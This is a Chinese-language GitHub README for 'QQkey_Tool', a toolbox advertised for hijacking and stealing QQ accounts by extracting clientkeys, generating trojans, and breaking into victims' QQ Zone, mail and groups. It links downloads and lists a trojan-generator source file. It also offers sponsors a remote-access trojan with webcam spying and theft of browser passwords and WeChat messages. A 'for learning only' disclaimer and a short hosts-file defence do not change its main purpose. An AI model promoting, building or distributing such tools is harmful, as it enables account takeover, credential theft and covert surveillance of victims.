****
# QQkey_Tool 
[![Author-sun589](https://img.shields.io/badge/Author-sun589-52616b.svg?logo=github)](https://github.com/sun589)
[![GitHub License](https://img.shields.io/github/license/sun589/QQkey_Tool?logo=github)](https://github.com/sun589/QQkey_Tool/blob/main/LICENSE)
[![Language-python](https://img.shields.io/badge/Language-python-yellow?logo=python)](https://github.com/sun589/QQkey_Tool)
[![Github stars](https://img.shields.io/github/stars/sun589/QQkey_Tool?style=flat&logo=github&color=7c7575)](https://github.com/sun589/QQkey_Tool/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/sun589/QQkey_Tool?style=flat&logo=github&color=455d7a)](https://github.com/sun589/QQkey_Tool/forks)  
[![GitHub Release](https://img.shields.io/github/v/release/sun589/QQkey_Tool?display_name=tag&style=flat&label=%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC&logo=github)](https://github.com/sun589/QQkey_Tool/releases/latest)
[![Github downloads](https://img.shields.io/github/downloads/sun589/QQkey_Tool/total?style=flat&color=red&label=%E6%80%BB%E4%B8%8B%E8%BD%BD%E9%87%8F&logo=github)](https://github.com/sun589/QQkey_Tool/releases)
[![GitHub Downloads (all assets, latest release)](https://img.shields.io/github/downloads/sun589/QQkey_Tool/latest/total?style=flat&label=%E6%9C%80%E6%96%B0%E4%B8%8B%E8%BD%BD%E9%87%8F&color=orange&logo=github)](https://github.com/sun589/QQkey_Tool/releases)  
> QQ远程控号&盗号/生成木马/突破空间&邮箱&QQ群/扫码控号/QQkey直取/Clientkey直取/发说说……

**最新项目:利用Clientkey即可登录所有qq登录的网站的工具! [QQLogin](https://github.com/sun589/QQLogin)!**  
**项目破100stars庆祝！**[请点我查看详细](https://github.com/sun589/QQkey_Tool/discussions/25)  
可能是你见过唯一还在持续更新的QQKey工具箱:)  

<details><summary>免责声明【必读】</summary>

### **本工具仅供学习和技术研究使用，不得用于任何非法行为，否则后果自负。**

**本工具的作者不对本工具的安全性、完整性、可靠性、有效性、正确性或适用性做任何明示或暗示的保证，也不对本工具的使用或滥用造成的任何直接或间接的损失、责任、索赔、要求或诉讼承担任何责任。**

**本工具的作者保留随时修改、更新、删除或终止本工具的权利，无需事先通知或承担任何义务。**

**本工具的使用者应遵守相关法律法规，尊重QQ的版权和隐私，不得侵犯QQ或其他第三方的合法权益，不得从事任何违法或不道德的行为。**

## **本工具的使用者在下载、安装、运行或使用本工具时，即表示已阅读并同意本免责声明。如有异议，请立即停止使用本工具，并删除所有相关文件。**

</details>  

## [如果觉得好用不妨赞助我,送专属远控木马一套(支持摄像头监控/获取浏览器保存密码/微信消息/获取Todesk手机号等功能)+挂上致谢名单](https://afdian.com/a/sun589)
***再次声明:本软件仅用于学习用途,请勿用于违法行为 后果自负!***  
****
# 目录

- [QQkey_Tool](#qqkey_tool)
  - [使用文档](https://github.com/sun589/QQkey_Tool/blob/main/docs/using_docs.md)
  - [使用说明](#使用说明)
  - [项目结构](#项目结构)
  - [致谢名单](#赞助者列表)
  - [常见问题 Q&A](#常见问题-qa)
    - [Q:如何使用](#q如何使用)
    - [Q:如何预防盗号病毒?](#q如何预防盗号病毒)
    - [Q:已经被对方获取QQKey控号了怎么办?](#q已经被对方获取qqkey控号了怎么办)
    - [Q:可以获取密码吗?](#q可以获取密码吗)
    - [Q:为什么我打不开?](#q为什么我打不开)
  - [预防盗号木马的方法](#预防盗号木马的方法)
    - [关于shellcode注入获取的clientkey](#关于shellcode注入获取的clientkey)
    - [关于使用网页快捷登录获取的clientkey(本工具的原理)](#关于使用网页快捷登录获取的clientkey本工具的原理)
  - [程序截图](#程序截图)
  - [仓库访问数量(从2024-10-14计起)](#仓库访问数量从2024-10-14计起)
  - [制作不易,如果喜欢,请给作者打个Star,谢谢:)))))))))))](#制作不易如果喜欢请给作者打个star谢谢)
****
#  使用说明
  下载[Release](https://github.com/sun589/QQkey_Tool/releases)/[蓝奏云(密码52yb)](https://wwap.lanzouv.com/b0xvu2ogh)(睁大眼睛看准版本号再下！！！！)里最新的版本打开QQKey_Tool.exe食用  
  or  
  下载[源代码](https://github.com/sun589/QQkey_Tool/)运行
****
# 项目结构
###### _~~原谅我代码写得很烂+各种奇奇怪怪的东西+代码写得有亿点不规范~~_
<details>
<summary>我的代码/我的内心belike:</summary>  

![image](https://github.com/user-attachments/assets/2c84adfe-11de-428e-80ef-3d82da9f846f)
![image](https://github.com/user-attachments/assets/0742b446-276e-4906-8af3-866625a53493)
![image](https://github.com/user-attachments/assets/59de75e4-4553-4dea-94e7-37ee563901aa)

</details>

    │  get_qq_info_ui.py // QQ盗号/木马专区源代码
    │  key_parser.py // Key解析器源码
    │  LICENSE // 项目开源协议
    │  QQKey_bug_fixer.py // QQkey漏洞修复器源码
    │  QQKey_Tool.py // 工具源代码
    │  README.md // 项目介绍
    │  requirements.txt // 源代码运行所需依赖
    │  二维码不存在.png // :D
    │  
    ├─.github // 存着些七七八八关于github的东西
    │  └─ISSUE_TEMPLATE
    │          bug.yml
    │          config.yml
    │          yh.yml
    │          
    ├─functions_code // 存储程序功能核心代码,方便学习与采纳(部分是旧版代码)
    │      Clientkey_thief.py // 木马生成器源码
    │      get_client_key.py // QQ本地信息获取源码(旧版)
    │      get_client_key_new.py // QQ本地信息获取源码(新版)
    │      README.md
    │      
    ├─program_pics // 程序截图(旧版)
    |       all.png // 程序整体界面截图
    |       主界面1.png
    |       主界面2.png  
    |
    ├─docs // 存放文档等文件
    |       using_docs.md // 使用文档
****
#  常见问题 Q&A
## Q：如何使用?
A:见[使用文档](https://github.com/sun589/QQkey_Tool/blob/main/docs/using_docs.md)
## Q:如何预防盗号病毒?
### A:详见 [预防盗号木马的方法](#预防盗号木马的方法)  

## Q:已经被对方获取QQKey控号了怎么办?  
A:请第一时间打开QQ[找回密码](https://accounts.qq.com/find/password)界面进行更改密码,由于tx对账号安全所顾虑在更改完后将立刻将此账号所登录的所有业务立即下线,即QQKey也将随同失效  
  
## Q:可以获取密码吗?  
A:So actually...此工具只能获取QQ的clientkey以及各种信息,不过可以通过clientkey突破空间与邮箱,也算间接获取密码了  

## Q:为什么我打不开?  
A:检查你的系统是否为32位,本工具仅支持64位系统,如果你是32位的话建议直接换一个64位系统(毕竟目前大部分软件也仅支持64位)
****
# 预防盗号木马的方法
## 关于shellcode注入获取的clientkey
这种的请自行到网上搜索qqkey预防获取工具,本工具通过网页快捷登录协议获取clientkey  
## 关于使用网页快捷登录获取的clientkey(本工具的原理)
***若觉得麻烦/不会操作可使用QQKey_Tool的3.2或者以上版本的防QQKey木马器进行一键修复/恢复**  
找到`C:\Windows\System32\drivers\etc\hosts`文件,打开它,换行后添加以下内容:  
```
0.0.0.0 localhost.ptlogin2.qq.com
```
注意:添加该行代码后请到cmd里执行`ipconfig /flushdns`以立即生效,  
在生效后虽然防住了盗号病毒但也不能使用登录页面的快捷登录了  
****
# 程序截图
![程序截图](https://github.com/user-attachments/assets/ae4742ab-3c7e-40c5-b9d1-5ee44e15cf5d)  
****
# 赞助者列表(每小时自动由bot更新)
<!-- START_SPONSORS -->
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-purple.png?imageView2/1/" alt="爱发电用户_3c00e" width="35" height="35"> 爱发电用户_3c00e - 30.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-blue.png" alt="爱发电用户_uCbU" width="35" height="35"> 爱发电用户_uCbU - 15.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-purple.png?imageView2/1/" alt="爱发电用户_d8b18" width="35" height="35"> 爱发电用户_d8b18 - 30.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-purple.png" alt="TexNova" width="35" height="35"> TexNova - 15.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-orange.png" alt="HalfDay_" width="35" height="35"> HalfDay_ - 15.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-orange.png" alt="爱发电用户_ykMC" width="35" height="35"> 爱发电用户_ykMC - 7.00元  
<img src="https://pic1.afdiancdn.com/user/0eb3cabe178311f0a70a52540025c377/avatar/0a9425d6856fb9fbc7e6000f3939d78a_w1080_h1066_s365.jpeg" alt="Roxyqwq" width="35" height="35"> Roxyqwq - 15.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-orange.png" alt="Conla_1337" width="35" height="35"> Conla_1337 - 50.00元  
<img src="https://pic1.afdiancdn.com/user/f3b0967009ca11ed8cf452540025c377/avatar/4a07313523bf523ddf5591e4b044d5ed_w240_h240_s3.png" alt="匿名用户" width="35" height="35"> 匿名用户 - 5.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-blue.png" alt="爱发电用户_gYub" width="35" height="35"> 爱发电用户_gYub - 7.00元  
<img src="https://pic1.afdiancdn.com/user/fc5dc87a0c7d11f0a5c052540025c377/avatar/75aec13406aaadd816b467f6c06a5ea3_w640_h640_s48.jpeg" alt="冷小白" width="35" height="35"> 冷小白 - 44.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-purple.png?imageView2/1/" alt="爱发电用户_c30ab" width="35" height="35"> 爱发电用户_c30ab - 5.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-purple.png?imageView2/1/" alt="爱发电用户_62189" width="35" height="35"> 爱发电用户_62189 - 30.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-purple.png?imageView2/1/" alt="爱发电用户_3d9ec" width="35" height="35"> 爱发电用户_3d9ec - 6.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-orange.png" alt="爱发电用户_j8v6" width="35" height="35"> 爱发电用户_j8v6 - 30.00元  
<img src="https://pic1.afdiancdn.com/user/736c790696c611ecba1d52540025c377/avatar/ed5c19785838cc61b0297a11ecfcfb3f_w460_h460_s167.png" alt="sun589" width="35" height="35"> sun589 - 30.00元  
<img src="https://pic1.afdiancdn.com/default/avatar/avatar-orange.png" alt="李跃进" width="35" height="35"> 李跃进 - 15.00元
<!-- END_SPONSORS -->
****
# 仓库访问数量(从2024-10-14计起)
![Visitor count](https://profile-counter.glitch.me/sun589-QQkey_Tool/count.svg)  
如果路过了不妨给个star:))))))))))))))))))))))))))))))))))))))))))
****
# 制作不易,如果喜欢,请给作者打个Star/赞助,谢谢:)))))))))))  
## [赞助我](https://afdian.com/a/sun589)
[![Star History Chart](https://api.star-history.com/svg?repos=sun589/QQkey_Tool&type=Date)](https://star-history.com/#sun589/QQkey_Tool&Date)  
****
